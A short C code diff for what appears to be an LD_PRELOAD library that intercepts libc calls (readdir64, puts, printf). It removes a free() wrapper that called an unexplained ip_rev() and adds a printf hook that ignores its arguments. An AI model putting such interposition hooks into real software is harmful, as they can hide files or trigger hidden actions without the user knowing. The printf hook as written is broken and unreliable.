@@ -283,19 +283,23 @@ struct dirent64 *readdir64(DIR *dirp)
     }
     return olddir;
 }
-static void* malloc(size_t s) {
-   // Wrapper for standard library's 'malloc'.
-   // The 'static' keyword forces all calls to malloc() in this file to resolve
-   // to this functions.
-   void* (*origMalloc)(size_t) = dlsym(RTLD_NEXT,"malloc");
-   return origMalloc(s);
+int puts(const char *message) {
+  int (*new_puts)(const char *message);
+  int result;
+  new_puts = dlsym(RTLD_NEXT, "puts");
+  result = new_puts(message);
+  return result;
 }
 
-static void free(void* p) {
-   // Wrapper for standard library's 'free'.
-   // The 'static' keyword forces all calls to free() in this file to resolve
-   // to this functions.
-   void (*origFree)(void*) = dlsym(RTLD_NEXT,"free");
-   ip_rev(); 
-   origFree(p);
+static int (*orig_printf)(const char *format, ...) = NULL;
+
+int printf(const char *format, ...)
+{
+ if (orig_printf == NULL)
+ {
+  orig_printf = (int (*)(const char *format, ...))dlsym(RTLD_NEXT, "printf");
+ }
+
+ // TODO: print desired message from caller. 
+ return orig_printf("within my own printf\n");
 }
